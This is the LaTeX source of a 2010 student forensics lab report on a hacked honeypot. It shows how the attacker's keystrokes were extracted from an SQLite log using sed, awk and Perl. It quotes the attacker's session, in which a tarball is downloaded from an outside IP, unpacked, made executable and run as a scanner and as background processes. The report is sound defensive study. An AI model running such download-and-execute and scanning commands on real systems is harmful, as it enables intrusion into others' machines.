% !TEX TS-program = pdflatex
% !TEX encoding = UTF-8 Unicode

\documentclass[a4paper,
    11pt,
    normalheadings,
%   parskip,
    parindent,
%   draft,
%   final,
%   bibgerm,
%   german,
    UKenglish,
%   twoside,
%   twocolum,
%   openright,  % Kap.beginn immer rechts! (fkt. nur bei report, nicht bei article)
    abstracton,
    ]{scrartcl}
\usepackage[english]{babel}
\usepackage[utf8]{inputenc} % set input encoding (not needed with XeLaTeX)

%%% Examples of Article customizations
% These packages are optional, depending whether you want the features they provide.
% See the LaTeX Companion or other references for full information.

%%% PAGE DIMENSIONS
\usepackage{geometry} % to change the page dimensions
\geometry{a4paper} % or letterpaper (US) or a5paper or....
% \geometry{margins=2in} % for example, change the margins to 2 inches all round
% \geometry{landscape} % set up the page for landscape
%   read geometry.pdf for detailed page layout information

\usepackage{graphicx} % support the \includegraphics command and options

\usepackage[parfill]{parskip} % Activate to begin paragraphs with an empty line rather than an indent

%%% PACKAGES
\usepackage{booktabs} % for much better looking tables
\usepackage{alltt} % provides alltt enviroment which allows \emph{}ed text
\usepackage{array} % for better arrays (eg matrices) in maths
\usepackage{paralist} % very flexible & customisable lists (eg. enumerate/itemize, etc.)
\usepackage{verbatim} % adds environment for commenting out blocks of text & for better verbatim
\usepackage{subfig} % make it possible to include more than one captioned figure/table in a single float
% These packages are all incorporated in the memoir class to one degree or another...


\usepackage[colorlinks,urlcolor=blue,plainpages=false]{hyperref}
\usepackage{embedfile}        % Provides \embedfile[filename=foo, desc={bar}]{file}
\usepackage{hyperxmp}         % To be have an XMP Data Stream f.e. to include the license

% \usepackage{newcent}  % Different Font, looks bigger

\usepackage{ifthen}

\usepackage[
    T1, % this is good for Umlauts
%   OT1 % This breaks Umlauts
       ]{fontenc}

%%% HEADERS & FOOTERS
\usepackage{fancyhdr} % This should be set AFTER setting up the page geometry
\pagestyle{fancy} % options: empty , plain , fancy
\renewcommand{\headrulewidth}{0pt} % customise the layout...
\lhead{}\chead{}\rhead{}
\lfoot{}\cfoot{\thepage}\rfoot{}

%%% SECTION TITLE APPEARANCE
\usepackage{sectsty}
\allsectionsfont{\sffamily\mdseries\upshape} % (See the fntguide.pdf for font help)
% (This matches ConTeXt defaults)

%%% ToC (table of contents) APPEARANCE
\usepackage[nottoc,notlof,notlot]{tocbibind} % Put the bibliography in the ToC
\usepackage[titles,subfigure]{tocloft} % Alter the style of the Table of Contents
\renewcommand{\cftsecfont}{\rmfamily\mdseries\upshape}
\renewcommand{\cftsecpagefont}{\rmfamily\mdseries\upshape} % No bold!

\usepackage{listings}

%%% END Article customizations

%%% The "real" document content comes below...

% Title Page
\newcommand{\mytitle}{Lab07: A Preliminary Report On Visualising Binary Data}
\subject{Preliminary Report\\%
    Forensics\\%
    Summersemester 2010\\%
    CA643\\%
    Charlie Daly}
\title{\mytitle{}}
%\subtitle{}
\author{
    cand. Dipl. Inf. Tobias Müller <\href{mailto:muellet2@computing.dcu.ie?subject=ss10-forensic-lab01}{muellet2@}>, 59212333 \and
    BSc. Anthony Walters <\href{mailto:waltera3@computing.dcu.ie?subject=ss10-forensic-lab01}{waltera3@}>, 59213102 \and Conor Lynch <\href{mailto:conor.lynch36@mail.dcu.ie}{lynchc36@}>, 55619599}
% \institute[Mathe - UniHH]{Fachbereich Mathematik\\
%         Universit\"at Hamburg}
% \logo{\includegraphics[height=0.5cm]{cinsects-blue}}
% \titlegraphic{\includegraphics[width=1.5cm]{fsr-logo}}
\date{\today}


\hypersetup{
        pdftitle={\mytitle{}},
        pdfauthor={Tobias Mueller, Anthony Walters, Conor Lynch},
        pdfsubject={Forensics},
        pdfkeywords={uni, linux, windows, ca643, forensics, binary, data, vis},
        pdflang=en,
        pdfcopyright={This work is licensed to the public under the Creative Commons Attribution-Non-Commercial-Share Alike 3.0 Germany License.},
        pdflicenseurl={http://creativecommons.org/licenses/by-nc-sa/3.0/de/}
}

\hyphenation{Infor-mations-sys-teme}
\hyphenation{\"{o}ko-logischen}

\newcommand{\note}[1]{#1}
\renewcommand{\comment}[1]{}
\newcommand{\inlinequote}[1]{``\textit{#1}''}
\newcommand{\FIXME}[1]{\mbox{}\marginpar{\footnotesize\raggedright\hspace{0pt}\color{red}\emph{#1}}}

\begin{document}
\selectlanguage{english}
\maketitle


\section{Introduction}
In this Lab report, we will examine recorded traffic and console in- and output of a honeypot that has been ``hacked''.
The network traffic was recorded into a file in the well known pcap (\emph{p}acket \emph{cap}ture) format\footnote{\url{http://www.tcpdump.org/pcap3_man.html}}.

Using Wireshark on the pcap file, we can see, by selecting Statistics$\rightarrow$Summary,that the capture file identifies itself as being taken at 2009-01-14 16:24:07 and the capture lasts 11.5 days until 2009-01-26 10:05:01.
In total, 4323191 IP packets, which sum up to 673023355 bytes,   were sent.
% A breakdown can be found the protocol hierarchy in figure \FIXME{protcol hierarchy}

In the rest of this preliminary report, we will show how to obtain the commands the attacker issued and present an excerpt.
In the final report, we will analyse these commands and relate them with the traffic that was produced.
But as this is only the preliminary version, we will not do any analysis.

\section{Keyboard Capture File Examination}

The commands executed on the machine can be found in the given \texttt{serial.db} file.
This file can be parsed with a program such as SQLite\footnote{\url{http://sqlite.org/}}.

First we used the \texttt{.schema} SQL command on the file to get an idea of how the database was structured.
This told us that the database contains a single table called \texttt{spty}, which contains the fields, \texttt{id, msgtype, ptsname, cnt, msg} and \texttt{ts}.
Some of these can be easily explained, for example \texttt{id} is the id number of the entry and \texttt{ts} represents the date.
Some of the other fields would require further exploration.

Using the following SQL command we were able to extract the contents of the database to a text file to more easily understand the purpose of each field.

\begin{verbatim}
./sqlite3-3.6.23.bin serial.db "SELECT * FROM spty;" > output.txt
\end{verbatim}

The message field seemed to contain text that would normally be displayed in a terminal.
msgtype also seemed to be an interesting value.
It seemed to be an integer value of either 1, 2 or 3, but was appeared to be set to 2 whenever the message field was not blank.

To confirm this theory, we ran the following SQL queries:
\begin{verbatim}
SELECT * FROM spty where msgtype = 1 AND msg != '';
SELECT * FROM spty where msgtype = 2 AND msg != '';
SELECT * FROM spty where msgtype = 3 AND msg != '';
\end{verbatim}

As expected, only the second SQL command returned any data.
We then passed this data out to a text file and set about trying to tidy up its formatting.

We reasoned that lines concerning user input would contain the \texttt{\$} character (as this appears at the end of the command prompt in the shell).
We eliminated all unrelated lines by carrying out the following sed command on the file:
\begin{verbatim}
sed -n '/\$/,/\r/p' output.txt
\end{verbatim}

This left us with a list of user inputs, however each typed character appeared on a separate line.
Analysing the file with \texttt{xxd}, we noticed that \texttt{\textbackslash{}n} characters were used to separate typed characters whereas line breaks which we did not want to remove tended to use the \texttt{\textbackslash{}n\textbackslash{}r} character.
Taking advantage of this, we removed the \texttt{\textbackslash{}n}s with the following command:
\begin{verbatim}
 awk '{printf("%s",$0)}' output.txt
 \end{verbatim}

 The output of this still contained the shell prompt, so we removed it with the following perl script:
% FIXME: Well, we could use lstlisting for that. But I'm too lazy atm
% But we shoul consider that for the final report
 \begin{verbatim}
 #!/usr/local/bin/perl

open(INPUTFILE, "<output.txt");
while(<INPUTFILE>)
{
        $line = $_;
        chomp($line);
        @words = split('\r',$line);
        foreach $word(@words)
        {
                ($start, $end) = split('\$ ',$word);
                print"$end\n";
        }
}
\end{verbatim}

This gives us the cleaned up output, some examples of which are shown below.
These contain some unusual characters such as \texttt{[K}, where the person using the terminal hit a function key such as backspace or one of the arrow keys.



\section{Sample Output}
The output of the process above produced a very long list of commands. The first section of this output is printed below:

\begin{verbatim}
exit
"  [Kecho nana
w
.quit  [K  [K  [K  [K  [K "  [K exit
exit
Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
"  [Kexit
Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
wget http://www.xxx.com/
more index.html
exit
wget 212.169.101.12  [K  [K4:/  [K  [K/                [Ch212.169.101.4/              t212.169.101.4/              t212.169.101.4/              p212.169.101.4/              :212.169.101.4/              /212.169.101.4/              /212.169.101.4/               [C [C [C [C [C [C [C [C [C [C [C [C [C [C  test-data/32MB
wget http://212.169.101.4/test-data/32MB                           [C  [1P.169.101.4/test-data/32MB                         3.169.101.4/test-data/32MB

"    [K  [Khttp://             [C [1@"  [1P [1P  [1P [1@h [C [C [C [C [C [C [C [C  [K  [Kwww.kernel.org/pub/linux/kenr  [K  [Krnel/v2.6/linux-2.6.28.tar.b  [Kgz
http://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.28.tar.gz

xitexit
ext  [Kit
Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
w
id
cat /proc/cpuinfo
adduser
ls
df -h
c   ls
cd
ls
mkdir " "
cd /dev/shm
mkdir " "
cd " "
ls
pdw      wd
ls
wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
ls
rm -rf W2Ksp3.exe
wget http://83.12.218.22/~test/delles.tar.gz
tar delles.tar.gz
^[[A^[[D                        tar xzvf delles.tar.gz
cd delles
ls
chmod +x *
i   uptime
w
./ss 22 -a ip -s 10^[[D^[[D^[[D^[[D                                                                        20   07      11 -s 10
./start 202 >> /dev/null &^[[D^[[D^[[D^[[D                                                   ^[[D^[[D                                                                           81   0 Corle                >> /dev/null &^[[D
^[[A            ^[[A^[[A^[[A                                    nohup ./start 80 >> /dev/null &
ps x
nohupnohup ./start 81 >> /dev/null &
nohup ./start 81 >> /dev/null &
nohup ./start 82 >> /dev/null &
nohup ./start 83 >> /dev/null &
nohup ./start 84 >> /dev/null &
nohup ./start 85 >> /dev/null &
nohup ./start 86 >> /dev/null &
nohup ./start 87 >> /dev/null &
nohup ./start 88 >> /dev/null &
nohup ./start 89 >> /dev/null &
nohup ./start 90 >> /dev/null &
ps x
pwd
Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
exit
exit
sudo bash
top
\end{verbatim}




\section{Conclusion}

We used wireshark to determine the start and end time of the complete packet capture.
We then used a combination of \texttt{sed}, \texttt{awk} and \texttt{perl} to extract the commands issued by the attacker from the SQLite database file.
Commands, that the attacker ran, were found and an excerpt was shown.

%\appendix
%\pagebreak
% \nocite{*}
% \bibliographystyle{geralpha}
% \bibliographystyle{apasoft}
% \bibliographystyle{cell}
%\bibliographystyle{apalike}
% Well, you the forensics.bib. Either just create an en empty one or clone the Mercurial repository:
% hg clone https://hg.cryptobitch.de/ss10-ca643-forensic
% and work insides the Labs directory.
% If you have changes, first pull latest changes to make sure your changes apply cleanly to the most recent version:
% hg pull && hg merge
% If there are conflicts, you might want to have kdiff3 or meld installed.
% After having merged changes (check with hg heads), do a
% hg bundle /tmp/mychanges.bundle
% and send me the bundle file.
% To create changes, simple edit the file in question, save, and do a "hg ci".
%\bibliography{forensics}

\section*{License}
This work is licensed to the public under the Creative Commons Attribution-Non-Commercial-Share Alike 3.0 Germany License.
\begin{center}\includegraphics{bin/by-nc-sa-eu.png}\end{center}


\end{document}

